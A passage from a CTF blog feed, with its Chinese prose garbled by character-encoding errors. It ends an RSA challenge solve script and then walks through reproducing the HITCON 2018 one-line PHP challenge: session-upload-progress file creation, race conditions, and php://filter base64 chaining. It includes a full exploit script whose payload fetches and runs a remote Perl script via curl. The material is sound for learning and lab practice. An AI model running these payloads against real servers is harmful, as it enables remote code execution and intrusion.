f1,f2</span></span><br><span class="line">e1=e1//<span class="number">14</span>;e2=e2//<span class="number">14</span></span><br><span class="line">phi1=(p1<span class="number">-1</span>)*(q1<span class="number">-1</span>);phi2=(p2<span class="number">-1</span>)*(q2<span class="number">-1</span>)</span><br><span class="line">d1=gmpy2.invert(e1,phi1);d2=gmpy2.invert(e2,phi2)</span><br><span class="line">f1=pow(c1,d1,n1);f2=pow(c2,d2,n2)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ËÆ∞ flag**14 ‰∏∫ f3,ÂàôÊúâÂêå‰ΩôÊñπÁ®ãÁªÑ f3 % n1 == f1; f3 % n2 == f2„ÄÇÂÖ∂‰∏≠f1,f2,n1,n2Â∑≤Áü•ÔºåÂèØÊ±ÇÊ®°lcm(n1,n2)ÊÑè‰πâ‰∏ãÁöÑËß£ f3„ÄÇ</span></span><br><span class="line"><span class="comment"># ÂèÇËÄÉ https://findneo.github.io/180727rsa-attack/#%E4%B8%AD%E5%9B%BD%E5%89%A9%E4%BD%99%E5%AE%9A%E7%90%86„ÄÇ</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">GCRT</span><span class="params">(mi, ai)</span>:</span></span><br><span class="line">    <span class="comment"># mi,aiÂàÜÂà´Ë°®Á§∫Ê®°Êï∞ÂíåÂèñÊ®°ÂêéÁöÑÂÄº,ÈÉΩ‰∏∫ÂàóË°®ÁªìÊûÑ</span></span><br><span class="line">    <span class="keyword">assert</span> (isinstance(mi, list) <span class="keyword">and</span> isinstance(ai, list))</span><br><span class="line">    curm, cura = mi[<span class="number">0</span>], ai[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">for</span> (m, a) <span class="keyword">in</span> zip(mi[<span class="number">1</span>:], ai[<span class="number">1</span>:]):</span><br><span class="line">        d = gmpy2.gcd(curm, m)</span><br><span class="line">        c = a - cura</span><br><span class="line">        <span class="keyword">assert</span> (c % d == <span class="number">0</span>) <span class="comment">#‰∏çÊàêÁ´ãÂàô‰∏çÂ≠òÂú®Ëß£</span></span><br><span class="line">        K = c // d * gmpy2.invert(curm // d, m // d)</span><br><span class="line">        cura += curm * K</span><br><span class="line">        curm = curm * m // d</span><br><span class="line">        cura %= curm</span><br><span class="line">    <span class="keyword">return</span> (cura % curm, curm) <span class="comment">#(Ëß£,ÊúÄÂ∞èÂÖ¨ÂÄçÊï∞)</span></span><br><span class="line">f3,lcm = GCRT([n1,n2],[f1,f2])</span><br><span class="line"><span class="keyword">assert</span>(f3%n1==f1);<span class="keyword">assert</span>(f3%n2==f2);<span class="keyword">assert</span>(lcm==p1*p2*q)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># assert(flag**14 % lcm == f3)</span></span><br><span class="line"><span class="comment"># Ê≠§Êó∂Ê±ÇÂá∫ÁöÑ f3 Êª°Ë∂≥‰∏äÂºè„ÄÇÂÖ∂‰∏≠ lcm==p1*p2*q Êúâ5‰∏™Á∫¶Êï∞: 1, p1*qÂç≥n1 ,p2*qÂç≥n2, p1*p2ËÆ∞‰Ωún3, lcm„ÄÇ</span></span><br><span class="line"><span class="comment"># ‰∏äÂºèÂèØÁúã‰Ωú pow(flag**2,7,lcm)==f3ÔºåÁ≠â‰ª∑‰∫é pow(flag**2,7,n1)==f3%n1,pow(flag**2,7,n2)==f3%n2,pow(flag**2,7,n3)==f3%n3</span></span><br><span class="line"><span class="comment"># Áî±‰∫é gcd(7,n1)==7,gcd(7,n2)==7„ÄÇÊâÄ‰ª•Â∞ùËØïÈÄâÂèñ pow(flag**2,7,n3)==f3%n3 ËÆ°ÁÆó flag**2 ÁöÑÂÄº</span></span><br><span class="line">n3=p1*p2</span><br><span class="line">c3=f3%n3</span><br><span class="line">phi3=(p1<span class="number">-1</span>)*(p2<span class="number">-1</span>)</span><br><span class="line"><span class="keyword">assert</span>(gmpy2.gcd(<span class="number">7</span>,phi3)==<span class="number">1</span>)</span><br><span class="line">d3=gmpy2.invert(<span class="number">7</span>,phi3)</span><br><span class="line">m3=pow(c3,d3,n3)</span><br><span class="line"><span class="keyword">if</span> gmpy2.iroot(m3,<span class="number">2</span>)[<span class="number">1</span>] == <span class="number">1</span>:</span><br><span class="line">    flag=gmpy2.iroot(m3,<span class="number">2</span>)[<span class="number">0</span>]</span><br><span class="line">    print(binascii.unhexlify(hex(flag)[<span class="number">2</span>:]))</span><br><span class="line"><span class="comment"># b'EIS&#123;Comm0n_Div15or_plus_CRT_is_so_easy|cb2733b9e69ab3a9bd526fa1&#125;'</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;ËøôÊòØÂíåÂà´‰∫∫ÂÆ∂ÁöÑÂ≠¶Âºü‰∫§ÊµÅÁöÑ‰∏ÄÈÅìÈ¢òÔºåÊçÆÁß∞ÊòØ2018È´òÊ†°ÁΩëÁªú‰ø°ÊÅØÂÆâÂÖ®ÁÆ°ÁêÜËøêÁª¥ÊåëÊàòËµõÁöÑRSAÈ¢òÁõÆÔºåÂèØ‰ª•Â∏ÆÂä©ÁêÜËß£Âú®RSAÂä†ÂØÜÔºàÂßë‰∏îËøòËøôÊ†∑Áß∞ÂëºÂÆÉÂêßÔºâ‰∏≠ÂΩìÂä†ÂØÜÊåáÊï∞eÂíåÊ¨ßÊãâÂáΩÊï∞phi‰∏ç‰∫íË¥®ÁöÑÊó∂ÂÄôÊÑèÂë≥ÁùÄ‰ªÄ‰πàÔºå‰ª•ÂèäÂèØËÉΩÁöÑËß£ÂÜ≥ÊñπÊ°à„ÄÇ&lt;/p&gt;
&lt;p&gt;Â¶ÇÊûúÊ≤°ÊúâÁêÜËß£ÈîôËØØÁöÑËØùÔºå‰∏ç‰∫íË¥®Âπ∂‰∏ç‰ºöÂØºËá¥Âä†ÂØÜ‰∏çÂÆâÂÖ®
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>one-line-php-challenge Â§çÁé∞</title>
    <link href="https://findneo.github.io/181123-one-line-php-challenge/"/>
    <id>https://findneo.github.io/181123-one-line-php-challenge/</id>
    <published>2018-11-23T00:31:07.000Z</published>
    <updated>2019-01-25T23:21:37.202Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Ê∫êÁ†Å"><a href="#Ê∫êÁ†Å" class="headerlink" title="Ê∫êÁ†Å"></a>Ê∫êÁ†Å</h1><p>ÁéØÂ¢ÉÔºö<code>This is a default installation PHP7.2 + Apache on Ubuntu 18.04</code> „ÄÇ</p><p><img src="2018-10-23_200848.png" alt="alt"> </p><h1 id="Ëß£ËØª"><a href="#Ëß£ËØª" class="headerlink" title="Ëß£ËØª"></a>Ëß£ËØª</h1><ul><li><code>$_GET</code> ÊòØ‰∏Ä‰∏™Êï∞ÁªÑÔºåÂåÖÂê´ÈÄöËøáURLÂèÇÊï∞‰º†ÁªôÂΩìÂâçËÑöÊú¨ÁöÑÂèòÈáè„ÄÇÂ¶ÇËÆøÈóÆ<code>localhost?orange=123&amp;foo=bar</code> ÔºåÂàô <code>$_GET</code> ‰∏∫ <code>array (&#39;orange&#39; =&gt; &#39;123&#39;,&#39;foo&#39; =&gt; &#39;bar&#39;,)</code> Ôºå<code>$_GET[&#39;orange&#39;]</code> ‰∏∫<code>&#39;123&#39;</code> „ÄÇÂè¶Â§ñÔºå<code>$_GET</code> ÊòØË∂ÖÂÖ®Â±ÄÂèòÈáèÔºåÂç≥Âú®ÂÖ®ÈÉ®‰ΩúÁî®Âüü‰∏≠ÂßãÁªàÂèØÁî®ÁöÑÂÜÖÁΩÆÂèòÈáè„ÄÇ</li><li><code>@</code>Ë¢´Áß∞‰∏∫ÈîôËØØÊéßÂà∂ËøêÁÆóÁ¨¶ÔºàError Control OperatorsÔºâ„ÄÇÂΩìÂ∞ÜÂÖ∂ÊîæÁΩÆÂú®‰∏Ä‰∏™ PHP Ë°®ËææÂºè‰πãÂâçÔºåËØ•Ë°®ËææÂºèÂèØËÉΩ‰∫ßÁîüÁöÑ‰ªª‰ΩïÈîôËØØ‰ø°ÊÅØÈÉΩË¢´ÂøΩÁï•Êéâ„ÄÇ‰æãÂ¶ÇÂØπ‰∫éÂÜÖÂÆπ‰∏∫<code>&lt;?php $_=$_GET[&#39;orange&#39;];</code> ÁöÑPHPÊñá‰ª∂ÔºåÁõ¥Êé•ËÆøÈóÆÂÖ∂‰ºöÊä•Èîô <code>Notice :  Undefined index: orange in...</code> ÔºåÂä†‰∏ä <code>@</code> ÂêéÂ∞±‰∏ç‰ºöÊòæÁ§∫ÈîôËØØ‰ø°ÊÅØ„ÄÇ</li><li>ËµãÂÄºÊìç‰Ωú„ÄÇÂíåCËØ≠Ë®Ä‰∏≠ÁöÑÊÉÖÂÜµ‰∏ÄÊ†∑ÔºåËµãÂÄºË°®ËææÂºèÁöÑÂÄºÂ∞±ÊòØËµãÂÄºÁ¨¶Âè∑Âè≥‰æßÁöÑÊìç‰ΩúÊï∞ÁöÑÂÄº„ÄÇ<code>The value of an assignment expression is the value assigned</code> „ÄÇ</li><li><code>$_</code> „ÄÇ‰∏Ä‰∏™ÊôÆÈÄöÁöÑÂèòÈáèÂêç„ÄÇ</li><li><code>file()</code> „ÄÇÊääÊï¥‰∏™Êñá‰ª∂ËØªÂÖ•Êï∞ÁªÑ‰∏≠„ÄÇ<ul><li><code>array file ( string $filename [, int $flags = 0 [, resource $context ]] )</code>  </li><li><img src="1542959895935.png" alt="1542959895935"></li><li><img src="1542960054923.png" alt="1542960054923"> </li></ul></li><li><code>string substr ( string $string , int $start [, int $length ] )</code> „ÄÇ</li><li>include ËØ≠Âè•ÂåÖÂê´Âπ∂ËøêË°åÊåáÂÆöÊñá‰ª∂„ÄÇ</li><li><code>(expr1) ? (expr2) : (expr3)</code> ÊòØ‰∏Ä‰∏™Êù°‰ª∂ËøêÁÆóÁ¨¶ÔºåÂíåCËØ≠Ë®ÄÁ±ª‰ºº„ÄÇ</li><li>‰ΩøÁî®orangeÂèÇÊï∞‰ªéURL‰º†ÂÖ•‰∏Ä‰∏™Êñá‰ª∂ÂêçÔºåÂ¶ÇÊûúËØ•Êñá‰ª∂Á¨¨‰∏ÄË°åÁöÑÂâçÂÖ≠‰∏™Â≠óÁ¨¶ÊòØ<code>@&lt;?php</code> ÔºåÂ∞±Â∞ÜÂÆÉÂåÖÂê´Âπ∂ËøêË°å„ÄÇ</li><li>Áõ∏ÂÖ≥ÊñáÊ°£Ôºö <a href="http://php.net/manual/en/language.operators.assignment.php" target="_blank" rel="noopener">Assignment Operators</a> , <a href="http://php.net/manual/en/reserved.variables.get.php" target="_blank" rel="noopener">$_GET</a> , <a href="http://php.net/manual/en/language.operators.errorcontrol.php" target="_blank" rel="noopener">Error Control Operators</a> ,  <a href="http://php.net/manual/zh/language.operators.comparison.php#language.operators.comparison.ternary" target="_blank" rel="noopener">‰∏âÂÖÉËøêÁÆóÁ¨¶</a> </li></ul><h1 id="ÂÖ≥ÈîÆÁÇπ"><a href="#ÂÖ≥ÈîÆÁÇπ" class="headerlink" title="ÂÖ≥ÈîÆÁÇπ"></a>ÂÖ≥ÈîÆÁÇπ</h1><h2 id="ÂàõÂª∫Êñá‰ª∂"><a href="#ÂàõÂª∫Êñá‰ª∂" class="headerlink" title="ÂàõÂª∫Êñá‰ª∂"></a>ÂàõÂª∫Êñá‰ª∂</h2><p><code>allow_url_include</code> ÈªòËÆ§ÂÄºÊòØ<code>off</code> ÔºåÂõ†Ê≠§Êó†Ê≥ïÂåÖÂê´ËøúÁ®ãÊñá‰ª∂„ÄÇÈÇ£‰πàÂ¶ÇÊûúË¶ÅÂåÖÂê´Êú¨Âú∞Êñá‰ª∂ÔºåÂ∞±ÈúÄË¶ÅÂ∑≤Áü•ÁöÑÊñá‰ª∂ÂêçÂíåÂèØÊéßÁöÑÊñá‰ª∂ÂÜÖÂÆπ„ÄÇ</p><p>ÊúÄ‰∏ªË¶ÅÁöÑÂà©Áî®ÁÇπÂú®‰∫éÔºöÂ¶ÇÊûúÂú®‰∏ä‰º†Êñá‰ª∂ÁöÑÂêåÊó∂POST <code>PHP_SESSION_UPLOAD_PROGRESS</code> ÂèÇÊï∞ÔºåPHPÂ∞±‰ºö‰∏∫Êàë‰ª¨ÂàõÂª∫sessionÔºåÂπ∂‰∏îsessionÊñá‰ª∂ÂêçÂèØ‰ª•ÈÄöËøácookie‰∏≠ÁöÑPHPSESSIDÊéßÂà∂„ÄÇ</p><p>ÂÅö‰∏™ÂÆûÈ™å„ÄÇ</p><p>ÊàëÁöÑÁéØÂ¢ÉÔºö<code>PHP7.2 + Apache on Kali 4.18</code> </p><p><img src="1542968416018.png" alt="1542968416018"></p><p>‰ºöÂèëÁé∞Á°ÆÂÆûÂ¶ÇÊ≠§„ÄÇËÄå‰∏î‰∏ç‰ªÖÂ¶ÇÊ≠§„ÄÇ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">curl -s 127.0.0.1/oneline.php -H <span class="string">'Cookie: PHPSESSID=iamnotorange'</span> -F <span class="string">'PHP_SESSION_UPLOAD_PROGRESS=this_is_findneo_speaking'</span> -F <span class="string">'file=@/etc/passwd'</span> 1&gt;/dev/null</span><br><span class="line">curl -s 127.0.0.1/oneline.php -H <span class="string">'Cookie: PHPSESSID=iamnotorange2'</span> -F <span class="string">'PHP_SESSION_UPLOAD_PROGRESS=this_is_findneo_speaking2'</span> -F <span class="string">'foobar=anystring'</span> 1&gt;/dev/null</span><br><span class="line">curl -s 127.0.0.1/oneline.php -H <span class="string">'Cookie: PHPSESSID=iamnotorange3'</span> -F <span class="string">'PHP_SESSION_UPLOAD_PROGRESS=this_is_findneo_speaking3'</span>  1&gt;/dev/null</span><br><span class="line">curl -s 127.0.0.1/oneline.php -H <span class="string">'Cookie: PHPSESSID=iamnotorange4'</span> -d <span class="string">'PHP_SESSION_UPLOAD_PROGRESS=this_is_findneo_speaking4'</span>  1&gt;/dev/null</span><br></pre></td></tr></table></figure><p>ÊàëÊâßË°å‰∫ÜÂõõÊ¨°ËØ∑Ê±Ç„ÄÇÁ¨¨‰∏ÄÊ¨°ÊòØ‰ΩøÁî®multipart‰º†‰∏Ä‰∏™Êñá‰ª∂Âíå‰∏Ä‰∏™Â≠óÁ¨¶‰∏≤ÔºåÂèØ‰ª•ÂêåÊó∂ÁîüÊàêsessionÊñá‰ª∂Âπ∂‰∏îÊéßÂà∂Êñá‰ª∂ÂêçÔºåÁ¨¨‰∫åÊ¨°‰º†‰∏§‰∏™Â≠óÁ¨¶‰∏≤ÔºåÂè™ËÉΩÁîüÊàêÊñá‰ª∂ÔºåÊñá‰ª∂ÂêçÊòØÈöèÊú∫ÁöÑÔºåÁ¨¨‰∏âÊ¨°Âè™Êúâ‰∏Ä‰∏™Â≠óÁ¨¶‰∏≤ÔºåÊïàÊûúÂêåÁ¨¨‰∫åÊ¨°ÔºåÁ¨¨Âõõ‰∏™Áõ¥Êé•post‰∏Ä‰∏™Â≠óÁ¨¶‰∏≤ÔºåÊó†Ê≥ïÁîüÊàêsessionÊñá‰ª∂„ÄÇÂõõÊ¨°ËØ∑Ê±ÇÁöÑÊä•ÊñáÂΩ¢ÂºèÂ¶Ç‰∏ã„ÄÇ</p><p><img src="1542969726963.png" alt="Á¨¨‰∏ÄÊ¨°"></p><p><img src="1542969783918.png" alt="Á¨¨‰∫åÊ¨°"></p><p><img src="1542969815646.png" alt="Á¨¨‰∏âÊ¨°"></p><p><img src="1542969856431.png" alt="Á¨¨ÂõõÊ¨°"></p><p>‰ΩÜÊòØÊàë‰ª¨Ëøò‰ºöÂèëÁé∞ÔºåÊó†ËÆ∫ÊÄéÊ†∑ËØ∑Ê±ÇÔºåÊñá‰ª∂ÂÜÖÂÆπÊÄªÊòØ‰∏∫Á©∫ÔºåËøôÊòØÂõ†‰∏∫ <code>session.upload_progress.cleanup=on</code> ÔºåÂØºËá¥Êñá‰ª∂‰∏Ä‰∏ä‰º†ÂÆåÈ©¨‰∏äË¢´Ê∏ÖÁ©∫„ÄÇËøôÊòØÊàë‰ª¨ÂèØ‰ª•Áî®Êù°‰ª∂Á´û‰∫âÊàñËÄÖ‰º†Ë∂ÖÂ§ßÊñá‰ª∂Êù•‰øùÁïôÊñá‰ª∂ÂÜÖÂÆπ„ÄÇ</p><h3 id="Êù°‰ª∂Á´û‰∫â"><a href="#Êù°‰ª∂Á´û‰∫â" class="headerlink" title="Êù°‰ª∂Á´û‰∫â"></a>Êù°‰ª∂Á´û‰∫â</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#loop.py</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> multiprocessing.dummy <span class="keyword">import</span> Pool <span class="keyword">as</span> threadpool</span><br><span class="line"></span><br><span class="line">sessname=<span class="string">"iamnotorange"</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">runner</span><span class="params">(i)</span>:</span></span><br><span class="line">cmd=<span class="string">"curl -s 127.0.0.1/oneline.php -H 'Cookie: PHPSESSID=%s' -F 'PHP_SESSION_UPLOAD_PROGRESS=this_is_findneo_speaking' -F 'file=@/etc/passwd' 1&gt;/dev/null"</span>%sessname</span><br><span class="line">os.system(cmd)</span><br><span class="line">os.system(<span class="string">"xxd /var/lib/php/sessions/sess_%s "</span>%sessname)</span><br><span class="line">pool=threadpool(<span class="number">30</span>)</span><br><span class="line">result=pool.map_async(runner,range(<span class="number">30</span>)).get(<span class="number">0xffff</span>)</span><br></pre></td></tr></table></figure><p><img src="1542964721887.png" alt="1542964721887"></p><p>ÂèØ‰ª•ËßÇÂØüÂà∞ÔºåÊñá‰ª∂ÂÜÖÂÆπÁöÑÂâç‰∏ÄÈÉ®ÂàÜÊòØÂèØÊéßÁöÑ„ÄÇ</p><h3 id="Ë∂ÖÂ§ßÊñá‰ª∂"><a href="#Ë∂ÖÂ§ßÊñá‰ª∂" class="headerlink" title="Ë∂ÖÂ§ßÊñá‰ª∂"></a>Ë∂ÖÂ§ßÊñá‰ª∂</h3><h2 id="ÂèòÊç¢Êñá‰ª∂ÂÜÖÂÆπ"><a href="#ÂèòÊç¢Êñá‰ª∂ÂÜÖÂÆπ" class="headerlink" title="ÂèòÊç¢Êñá‰ª∂ÂÜÖÂÆπ"></a>ÂèòÊç¢Êñá‰ª∂ÂÜÖÂÆπ</h2><p>Âà∞Ê≠§‰∏∫Ê≠¢ÔºåÊàë‰ª¨ÂÆûÁé∞‰∫ÜÊéßÂà∂Êñá‰ª∂ÂêçÂíåÊñá‰ª∂ÂÜÖÂÆπÔºå‰ΩÜÊòØÊñá‰ª∂ÂÜÖÂÆπÁöÑÂΩ¢ÂºèÊòØÂõ∫ÂÆöÁöÑÔºåÂç≥‰ª•<code>upload_progress_</code> ÂºÄÂ§¥ÔºåËÄåÊàë‰ª¨ÊúüÊúõ‰ªñÊòØ‰ª• <code>@&lt;?php</code> ÂºÄÂ§¥„ÄÇ‰∫éÊòØÈúÄË¶ÅÂèòÊç¢Êñá‰ª∂ÂÜÖÂÆπÔºåÂèØ‰ª•Âà©Áî® <code>php://filter</code> ÔºåÊØîÂ¶ÇÂ∞ÜÊñá‰ª∂ÂÜÖÂÆπÂ§öÊ¨°base64Ëß£Á†ÅÂæóÂà∞Êàë‰ª¨ÊÉ≥Ë¶ÅÁöÑÂ≠óÁ¨¶‰∏≤„ÄÇ</p><p>base64Ëß£Á†ÅÁöÑÁâπÁÇπÂú®‰∫éÔºö</p><ul><li>ÂèØ‰ª•Â∞ÜÂ≠óÁ¨¶‰∏≤ÊØèÂõõ‰∏™Â≠óÁ¨¶ÂàÜ‰∏ÄÁªÑÔºåÊØèÁªÑËß£Á†ÅÂêéÂèòÊàê‰∏â‰∏™Â≠óÁ¨¶ÔºåÁªÑ‰∏éÁªÑ‰πãÈó¥‰∫í‰∏çÂΩ±Âìç„ÄÇ</li><li>base64ÁºñÁ†ÅÂêéÁöÑÂ≠óÁ¨¶‰∏≤Âè™‰ºöÂåÖÂê´ <code>[0-9a-z-A-Z+\=]</code> ÔºåÂ¶ÇÊûúËß£Á†ÅÊó∂ÈÅáÂà∞Ëøô‰∫õÂ≠óÁ¨¶‰πãÂ§ñÁöÑÂ∞±‰ºöË¢´ÂøΩÁï•ÔºåÊàñËÄÖËØ¥ÔºåËß£Á†ÅÂâç‰ºöÂÖàÂ∞ÜÈùûÊ≥ïÂ≠óÁ¨¶Âà†Èô§„ÄÇ</li></ul><p>ÊâÄ‰ª•ÂÆûÈôÖ‰∏ä</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">"import base64;print base64.b64decode('\x11\x22\x23\x24'*24+base64.b64encode('test'))"</span></span><br></pre></td></tr></table></figure><p>ÁöÑÊâßË°åÁªìÊûúËøòÊòØtest„ÄÇ</p><p>Êàë‰ª¨Âè™Ë¶ÅÊÉ≥ÂäûÊ≥ïËÆ©<code>upload_progress_</code> Ëß£Á†ÅÂêéÊàê‰∏∫‰∏çÂêàÊ≥ïÂ≠óÁ¨¶‰ªéËÄåË¢´ÂøΩÁï•Â∞±ÂèØ‰ª•‰∫ÜÔºåÊâÄ‰ª•ÈúÄË¶ÅÂä†‰∏Ä‰∫õÂûÉÂúæÊï∞ÊçÆ„ÄÇÂõ†‰∏∫ <code>upload_progress_</code> Êúâ16‰∏™Â≠óÁ¨¶</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="ÁªìÂêàÂà©Áî®"><a href="#ÁªìÂêàÂà©Áî®" class="headerlink" title="ÁªìÂêàÂà©Áî®"></a>ÁªìÂêàÂà©Áî®</h1><p>Â∞ÜËØ∏Â¶Ç </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@&lt;?php `curl remote.ip | php - ;?&gt;`</span><br></pre></td></tr></table></figure><p>ÁöÑpayload‰∏âÊ¨°ÁºñÁ†ÅÂÜçÂä†‰∏äÂ°´ÂÖÖÊï∞ÊçÆÂêé‰Ωú‰∏∫ <code>PHP_SESSION_UPLOAD_PROGRESS</code> ÁöÑÂÄº‰∏ä‰º†ÔºåÁÑ∂ÂêéÂà©Áî®</p><p><code>php://filter/convert.base64-decode|convert.base64-decode|convert.base64-decode/resource=/var/lib/php/sessions/sess_whatever</code> ÂåÖÂê´ËøõÊù•Âç≥ÂèØÊâßË°åÂëΩ‰ª§„ÄÇÂèØÈááÁî®Â§öÁ∫øÁ®ãÁ´û‰∫âÊàñËÄÖÂ§ßÊñá‰ª∂‰∏ä‰º†‰øùÁïôsessionÊñá‰ª∂„ÄÇ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#https://github.com/orangetw/My-CTF-Web-Challenges/blob/master/hitcon-ctf-2018/one-line-php-challenge/exp_for_php.py</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64encode</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> sample, randint</span><br><span class="line"><span class="keyword">from</span> multiprocessing.dummy <span class="keyword">import</span> Pool <span class="keyword">as</span> ThreadPool</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">HOST = <span class="string">'http://54.250.246.238/'</span></span><br><span class="line">sess_name = <span class="string">'iamorange'</span></span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">'Connection'</span>: <span class="string">'close'</span>, </span><br><span class="line">    <span class="string">'Cookie'</span>: <span class="string">'PHPSESSID='</span> + sess_name</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'@&lt;?php `curl orange.tw/w/bc.pl|perl -`;?&gt;'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    junk = <span class="string">''</span>.join(sample(string.ascii_letters, randint(<span class="number">8</span>, <span class="number">16</span>)))</span><br><span class="line">    x = b64encode(payload + junk)</span><br><span class="line">    xx = b64encode(b64encode(payload + junk))</span><br><span class="line">    xxx = b64encode(b64encode(b64encode(payload + junk)))</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'='</span> <span class="keyword">not</span> <span class="keyword">in</span> x <span class="keyword">and</span> <span class="string">'='</span> <span class="keyword">not</span> <span class="keyword">in</span> xx <span class="keyword">and</span> <span class="string">'='</span> <span class="keyword">not</span> <span class="keyword">in</span> xxx:</span><br><span class="line">        payload = xxx</span><br><span class="line">        <span class="keyword">print</span> payload</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">runner1</span><span class="params">(i)</span>:</span></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">'PHP_SESSION_UPLOAD_PROGRESS'</span>: <span class="string">'ZZ'</span> + payload + <span class="string">'Z'</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        fp = open(<span class="string">'/etc/passwd'</span>, <span class="string">'rb'</span>)</span><br><span class="line">        r = requests.post(HOST, files=&#123;<span class="string">'f'</span>: fp&#125;, data=data, headers=headers)</span><br><span class="line">        fp.close()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">runner2</span><span class="params">(i)</span>:</span></span><br><span class="line">    filename = <span class="string">'/var/lib/php/sessions/sess_'</span> + sess_name</span><br><span class="line">    filename = <span class="string">'php://filter/convert.base64-decode|convert.base64-decode|convert.base64-decode/resource=%s'</span> % filename</span><br><span class="line">    <span class="comment"># print filename</span></span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        url = <span class="string">'%s?orange=%s'</span> % (HOST, filename)</span><br><span class="line">        r = requests.get(url, headers=headers)</span><br><span class="line">        c = r.content</span><br><span class="line">        <span class="keyword">if</span> c <span class="keyword">and</span> <span class="string">'orange'</span> <span class="keyword">not</span> <span class="keyword">in</span> c:</span><br><span class="line">            <span class="keyword">print</span> [c]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> sys.argv[<span class="number">1</span>] == <span class="string">'1'</span>:</span><br><span class="line">    runner = runner1</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    runner = runner2</span><br><span class="line"></span><br><span class="line">pool = ThreadPool(<span class="number">32</span>)</span><br><span class="line">result = pool.map_async( runner, range(<span class="number">32</span>) ).get(<span class="number">0xffff</span>)</span><br></pre></td></tr></table></figure><h1 id="Áõ∏ÂÖ≥ÈìæÊé•"><a href="#Áõ∏ÂÖ≥ÈìæÊé•" class="headerlink" title="Áõ∏ÂÖ≥ÈìæÊé•"></a>Áõ∏ÂÖ≥ÈìæÊé•</h1><ul><li><a href="http://www.wupco.cn/?p=4460" target="_blank" rel="noopener">http://www.wupco.cn/?p=4460</a> </li><li><a href="https://github.com/orangetw/My-CTF-Web-Challenges#one-line-php-challenge" target="_blank" rel="noopener">https://github.com/orangetw/My-CTF-Web-Challenges#one-line-php-challenge</a> </li><li><a href="https://bugs.php.net/bug.php?id=72681" target="_blank" rel="noopener">https://bugs.php.net/bug.php?id=72681</a> </li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Ê∫êÁ†Å&quot;&gt;&lt;a href=&quot;#Ê∫êÁ†Å&quot; class=&quot;headerlink&quot; title=&quot;Ê∫êÁ†Å&quot;&gt;&lt;/a&gt;Ê∫êÁ†Å&lt;/h1&gt;&lt;p&gt;ÁéØÂ¢ÉÔºö&lt;code&gt;This is a default installation PHP7.2 + Apache on Ubuntu 18.0
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>SECCON 2018</title>
